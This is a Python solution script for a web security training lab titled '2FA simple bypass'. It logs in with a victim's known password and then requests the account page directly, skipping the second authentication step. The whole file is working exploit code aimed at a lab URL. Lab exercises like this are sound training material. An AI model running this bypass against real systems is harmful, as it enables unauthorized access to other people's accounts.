#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/8/2023
#
# Lab: 2FA simple bypass
#
# Steps: 1. Login as carlos
#        2. Extract the session from the Set-Cookie header
#        3. Request /login2 using the extracted session
#        4. Request /my-account directly bypassing 2FA
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a5100ef033977418075daa3006d001a.web-security-academy.net"

# create a new session to use in all subsequent requests
client = requests.session()

# set data to send via POST
data = {
    "username": "carlos",
    "password": "montoya"
}

try: 
    # login as carlos
    login = client.post(f"{url}/login", data, allow_redirects=False)

except:
    print(Fore.RED + "Login request failed through exception")
    exit(1)

# if logging in succeeded
if login.status_code == 302: 
    print("1. Logged in as carlos.. OK")
    
    try: 
        # fetch the /login2 
        login2 = client.get(f"{url}/login2")

    except:
        print(Fore.RED + "Requesting /login2 page failed through exception")
        exit(1)
 
    print("2. GET /login2 using extracted session.. OK")
    
    try: 
        # fetch /my-account directrly
        home_res = client.get(f"{url}/my-account?id=carlos")
        
    except:
        print(Fore.RED + "Requesting /my-account page failed through exception")
        exit(1)

    print("3. GET /my-account directly bypassing 2FA.. OK")
    
    # search for carlos in the body to make sure that you logged in as carlos
    pattern = re.findall("Your username is: carlos", home_res.text)
    
    # if pattern was found
    if len(pattern) != 0: 
        print(Fore.GREEN + "✅ Logged in successfully as Carlos")
    
    else:
        print(Fore.RED + "Failed to login as Carlos")

else:
    print(Fore.RED + "Failed to login as carlos")
